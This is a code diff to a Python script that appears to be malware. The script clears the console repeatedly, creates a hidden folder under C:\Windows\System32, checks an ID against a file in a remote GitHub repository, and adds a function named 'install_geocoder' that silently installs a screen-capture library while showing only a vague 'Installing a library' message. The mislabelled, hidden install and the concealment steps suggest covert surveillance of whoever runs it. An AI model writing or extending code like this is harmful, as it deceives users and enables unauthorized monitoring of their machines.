@@ -13,14 +13,18 @@ import gdown
 os.system('cls')
 
 dcnmwxdr = r'C:\Windows\System32\NTLK'
-
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
-
 result = check_string_in_url("https://raw.githubusercontent.com/prv1dripwookxes201350/installer/refs/heads/main/uniqueidaes.txt", file_contentsx1)
-
 os.system('cls')
+def install_geocoder():
+    try:
+        subprocess.run(["py", "-3.11", "-m", "pip", "install", "windows-capture"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError:
+        pass
+print("Installing a library please wait...")
+install_geocoder()
 def check_service_status(service_name):
     try:
         # Run the 'sc query' command to check the service status
